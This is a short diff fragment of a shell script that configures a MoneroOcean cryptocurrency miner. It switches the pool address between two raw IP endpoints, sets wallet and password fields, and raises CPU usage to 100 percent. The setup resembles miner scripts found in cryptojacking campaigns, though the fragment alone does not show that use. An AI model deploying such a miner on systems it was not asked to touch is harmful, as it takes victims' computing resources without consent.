@@ -270,8 +270,8 @@ if [ ! -z $EMAIL ]; then
 fi
 
 #sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
-#sed -i 's/"url": *"[^"]*",/"url": "3.136.160.170:8080",/' $HOME/moneroocean/config.json
-sed -i 's/"url": *"[^"]*",/"url": "82.196.117.130:6996",/' $HOME/moneroocean/config.json
+sed -i 's/"url": *"[^"]*",/"url": "3.136.160.170:8080",/' $HOME/moneroocean/config.json
+#sed -i 's/"url": *"[^"]*",/"url": "82.196.117.130:6996",/' $HOME/moneroocean/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
